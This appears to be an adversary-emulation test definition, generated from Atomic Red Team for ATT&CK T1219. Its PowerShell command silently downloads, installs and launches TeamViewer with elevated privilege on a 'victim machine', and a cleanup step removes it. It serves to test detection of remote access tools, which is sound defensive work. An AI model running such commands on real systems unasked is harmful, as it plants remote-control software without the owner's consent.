- id: 75eee53b-6016-4822-9791-b0f7f9432bf6
  name: TeamViewer Files Detected Test on Windows (Generated from Atomic Red Team)
  description: |
    Ability for Remote Access Tools (ATT&CK T1219). 
    Downloads, installs, and executes TeamViewer on the victim machine.
    Generated from Atomic Red Team procedures (8ca3b96d-8983-4a7f-b125-fc98cc0a2aa0); review and test safely before use.
  tactic: command-and-control
  technique:
    attack_id: T1219
    name: Remote Access Tools
  privilege: Elevated
  platforms:
    windows:
      psh:
        command: |
          Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe;
          $file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe";
          Start-Process -Wait $file1 /S;
          Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'
        cleanup: |
          $file = 'C:\Program Files (x86)\TeamViewer\uninstall.exe';
          if(Test-Path $file){ Start-Process $file "/S" -ErrorAction Ignore | Out-Null }
          $file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe";
          Remove-Item $file1 -ErrorAction Ignore | Out-Null
